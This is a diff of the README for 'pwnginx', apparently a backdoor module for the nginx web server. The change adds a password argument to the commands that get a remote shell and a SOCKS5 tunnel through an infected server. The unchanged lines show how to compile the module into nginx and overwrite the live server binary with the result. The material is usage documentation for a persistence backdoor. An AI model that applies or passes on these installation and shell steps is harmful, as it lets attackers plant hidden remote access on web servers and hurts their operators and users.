@@ -8,11 +8,11 @@ Usage:
 
 Get a shell access via the nginx running @ [ip]:[port]
 
-    ./pwnginx shell [ip] [port]
+    ./pwnginx shell [ip] [port] [password]
 
 Get a socks5 tunnel listening at [socks5ip]:[socks5port]
 
-    ./pwnginx socks5 [ip] [port] [socks5ip] [socks5port]
+    ./pwnginx socks5 [ip] [port] [socks5ip] [socks5port] [password]
 
 
 ###Features:
@@ -38,6 +38,7 @@ Get a socks5 tunnel listening at [socks5ip]:[socks5port]
 * Recompile nginx:
 
     $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make (There is no need to run `make install`)
+
     $ sudo cp -f objs/nginx /path/to/nginx/sbin/nginx
 
 * Restart nginx
